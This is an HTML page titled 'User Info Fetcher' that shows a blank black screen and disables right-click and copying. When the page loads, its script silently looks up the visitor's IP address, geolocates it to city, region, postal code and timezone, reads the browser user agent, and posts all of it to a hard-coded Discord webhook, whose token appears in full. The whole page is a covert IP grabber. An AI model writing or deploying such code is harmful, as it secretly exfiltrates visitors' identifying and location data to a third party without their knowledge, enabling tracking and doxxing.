<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Info Fetcher</title>
    <style>
        body {
            background-color: black;
            color: white;
            overflow: hidden;
        }

        body::selection {
            background-color: transparent;
        }

        body::-moz-selection {
            background-color: transparent;
        }
    </style>
</head>
<body oncontextmenu="return false" oncopy="return false">

<script>
  async function getIpAddress() {
    const response = await fetch('https://api64.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  }

  function getIpType(ipAddress) {
    return ipAddress.includes(':') ? 'IPv6' : 'IPv4';
  }

  async function getLocationInfo(ipAddress) {
    const response = await fetch(`https://ipapi.co/${ipAddress}/json/`);
    const data = await response.json();
    return data;
  }

  function getUserAgent() {
    return navigator.userAgent;
  }

  async function sendToDiscord(ipAddress, locationInfo, userAgent) {
    const { city, region, timezone, postal, country } = locationInfo;
    const ipType = getIpType(ipAddress);

    const webhookURL = 'https://discord.com/api/webhooks/1197340200276344852/oMGzClEWwTYkBG9qF0UYTdcqvCnfZPDX2JhCtc1B0gT5LZmOCyPxBtRwIcIOSIW4lpZY';

    const discordColor = (49 << 16) + (51 << 8) + 56;

    const payload = {
        embeds: [{
            title: ipAddress.toLowerCase(),
            color: discordColor,
            fields: [
                { name: "city", value: city ? city.toLowerCase() : 'N/A' },
                { name: "state", value: region ? region.toLowerCase() : 'N/A' },
                { name: "country", value: country ? country.toLowerCase() : 'N/A' },
                { name: "zip code", value: postal ? postal.toLowerCase() : 'N/A' },
                { name: "timezone", value: timezone ? timezone.toLowerCase() : 'N/A' },
                { name: "type", value: ipType.toLowerCase() },
                { name: "user agent", value: userAgent.toLowerCase() },
            ],
        }],
    };

    await fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    });
  }

  async function main() {
    try {
      const ipAddress = await getIpAddress();
      const locationInfo = await getLocationInfo(ipAddress);
      const userAgent = getUserAgent();
      await sendToDiscord(ipAddress, locationInfo, userAgent);
    } catch (error) {
      console.error('Error:', error);
    }
  }

  main();
</script>

</body>
</html>
